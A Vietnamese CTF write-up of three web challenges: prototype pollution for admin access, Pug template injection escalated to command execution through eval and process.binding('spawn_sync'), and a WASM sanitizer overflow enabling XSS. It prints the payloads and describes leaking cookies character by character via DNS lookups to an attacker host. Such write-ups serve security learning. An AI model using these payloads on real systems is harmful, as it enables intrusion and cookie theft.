---
title: "W1 Playground Writeup"
date: 2024-05-01 00:00:00 +0800
categories: [CTF Writeup]
tags: [Prototype Pollution, SSTI, API testing, XSS, PHP]
---

## Bài 1: easy login

![image](https://i.imgur.com/paDR37b.png)

Phân tích qua code thì chúng ta có 2 endpoint cần để tâm là "/login" và "/admin"

![image](https://i.imgur.com/ljSahfY.png)

![image](https://i.imgur.com/mr7eats.png)

Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhập
Chức năng admin kiểm tra xem chúng ta có phải admin không qua `isAdmin=true` sau khi phân tích jwtkey
Sau khi phân tích bài này dính lỗi Prototype Pollution bằng cách thêm `logindata["__proto__"][isAdmin]=true` vào thì prototype của `logindata` sẽ có thuộc tính `isAdmin=true` từ đó logindata sẽ kế thừa thuộc tính đó
Payload

![image](https://i.imgur.com/t62zoI3.png)

Có jwtkey rồi thì vào admin để lấy flag thôi

![image](https://i.imgur.com/NdpGVoS.png)

**Flag : W1{REDACTED}**


## Bài 2: render4free

![image](https://i.imgur.com/KTMygHL.png)

Phân tích qua code thì web này đang sử dụng Pug template engine để in ra các ký tự chúng ta gõ vào
Sau khi phân tích code thì chúng ta có thể rút ra web đang dính lỗi SSTI nhưng có 1 function này đang chặn chúng ta khai thác SSTI

![image](https://i.imgur.com/SliIvxB.png)

Sau khi đọc pug document thì chúng ta có thể sử dụng "-" để viết code js

![image](https://i.imgur.com/5mAiiby.png)

Bây giờ chúng ta có thể dùng "-" để viết code js thì chúng ta viết gì ? Đó chính là ghi đè lại function filter ký tự của chúng ta

```- global.replace_bad_char = str_to_replace => str_to_replace```
Tiếp tục ghi đè lại function trên để chúng ta có thể thực hiện lệnh eval

```- global.replace_bad_char = str_to_replace => eval(str_to_replace)```
Sau khi ghi đè được rồi thì viết vào để thử thực hiện RCE nào
Payload ```require('child_process').exec('ping hacked.sv')```
![image](https://i.imgur.com/ACbksnM.png)
Làm gì dễ thế anh Shin24 (author bài này) đã set type của nodejs là module tức chúng ta không thể require mà phải sử dụng import
Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả về null

![image](https://i.imgur.com/2wwyD2a.png)

Oat gì dark vậy, lúc này chúng ta sử dụng process.binding để import các modules của nodejs
```js
  process.binding('spawn_sync').spawn({ 
    file: 'ls',
    args: [''],
    stdio: [
        { type: 'pipe', readable: true, writable: false },
        { type: 'pipe', readable: false, writable: true },
        { type: 'pipe', readable: false, writable: true }
  ]}).output.toString()
  ```
![image](https://i.imgur.com/zswZKe6.png)

Ngon vậy là có thể thực hiện lệnh ls
Để ý ở file Docker author đã tạo ra 1 file /read_flag để đọc flag vậy chúng ta thực thi file read_flag để nhận flag

![image](https://i.imgur.com/5EUqBt7.png)

Payload:
 ```js
  process.binding('spawn_sync').spawn({ 
    file: '/read_flag',
    args: [''],
    stdio: [
        { type: 'pipe', readable: true, writable: false },
        { type: 'pipe', readable: false, writable: true },
        { type: 'pipe', readable: false, writable: true }
  ]}).output.toString()
  ```

  ![image](https://i.imgur.com/dKfBXot.png)


  **Flag: W1{REDACTED}**



## Bài 3: Super sanitizer

  ![image](https://i.imgur.com/IZdGXnh.png)

  Tóm tắt bài web này sử dụng WASM được compile từ C và sử dụng nó để xử lý input của user
  File C nhận input của user và blacklist để xử lý nếu có ký tự blacklist thì ký tự đó sẽ bị xoá khỏi input của user

  ![image](https://i.imgur.com/4gXTA7l.png)

  Blacklist của bài này như sau `<imgoner='\"'>`

  Lỗi của bài này nằm ở đây

  ![image](https://i.imgur.com/zaOqpyM.png)

  Khi chúng ta cho 1 ký tự có độ dài là `0x300` thì `raw_str[0x300]` sẽ bị tràn và sẽ ghi đè lên ký tự đầu tiên của blacklist là `\x00` từ đó blacklist sẽ trở thành rỗng -> bypass filter

  Nhưng đến đây thì vẫn chưa xong, web có CSP để làm XSS khó hơn

  Sau một lúc fuzzing để kiểm tra thì dù CSP chặn redirect nhưng `window.location.href=hackerwebsite.com` vẫn resolve dns vậy ta có thể tận dụng cái này để leak flag do flag khá dài nên mình leak 2 lần để lấy flag (ví dụ `flag.hackerwebsite.com`)

  Nhưng leak kiểu gì? Mình đã thử leak kiểu `btoa(document.cookie)+".hackerwebsite.com"` nhưng khi leak thì vì lý do bảo mật dns query sẽ ngẫu nhiên uppercase hoặc lowercase các ký tự làm base64 bị lỗi nên nghĩ sang cách khác là `document.cookie.charCodeAt(0->document.cookie.length-1)` để leak ra từng ký tự của flag sang mã ascii

  Payload các bạn tự craft nhé


  ![image](https://i.imgur.com/JhaUWFx.png)

  **Flag: W1{REACTED}**










